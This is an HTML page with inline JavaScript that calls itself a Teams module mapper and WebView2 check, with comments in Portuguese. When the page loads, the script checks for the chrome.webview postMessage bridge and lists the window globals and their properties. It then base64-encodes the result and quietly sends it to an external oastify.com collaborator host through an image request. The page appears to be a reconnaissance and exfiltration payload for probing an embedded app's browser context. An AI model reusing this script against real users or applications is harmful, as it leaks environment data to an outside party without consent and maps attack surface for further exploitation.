<!DOCTYPE html>
<html>
<head>
  <title>Teams Module Mapper + WebView2 Check</title>
</head>
<body>
  <h1>Scanning Teams Modules...</h1>

  <script>
    (async () => {
      const inventory = {
        origin: location.origin,
        hostname: location.hostname,
        userAgent: navigator.userAgent,
        foundModules: {},
        errors: [],
        specialChecks: {
          chromeWebview: false,
          chromeWebviewPostMessage: false
        }
      };

      // Verificação direta de WebView2
      try {
        if (window.chrome && window.chrome.webview) {
          inventory.specialChecks.chromeWebview = true;
          if (typeof window.chrome.webview.postMessage === "function") {
            inventory.specialChecks.chromeWebviewPostMessage = true;
          }
        }
      } catch (e) {
        inventory.errors.push({ check: "chrome.webview", error: String(e) });
      }

      // Escaneia objetos/funções no window
      const windowKeys = Object.keys(window);
      for (const key of windowKeys) {
        try {
          const val = window[key];
          if (typeof val === "function") {
            inventory.foundModules[key] = "function";
          } else if (typeof val === "object" && val !== null) {
            const props = Object.getOwnPropertyNames(val);
            inventory.foundModules[key] = {
              type: "object",
              props: props.slice(0, 20)
            };
          }
        } catch (err) {
          inventory.errors.push({ key, error: String(err) });
        }
      }

      // Envia resultado em 1 request
      const base64 = btoa(unescape(encodeURIComponent(JSON.stringify(inventory))));
      const url = "https://j9tu8az13ssynazi9fayiqrv8med23qs.oastify.com/?resposta=" + base64;

      const img = new Image();
      img.src = url;
    })();
  </script>
</body>
</html>
